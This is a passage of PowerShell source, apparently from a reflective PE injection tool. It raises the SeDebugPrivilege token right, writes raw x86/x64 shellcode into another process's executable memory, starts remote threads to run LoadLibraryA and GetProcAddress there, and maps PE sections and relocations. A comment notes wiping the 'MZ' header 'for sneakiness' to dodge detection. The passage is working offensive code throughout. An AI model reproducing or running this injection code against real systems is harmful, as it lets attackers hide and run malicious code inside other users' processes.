				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
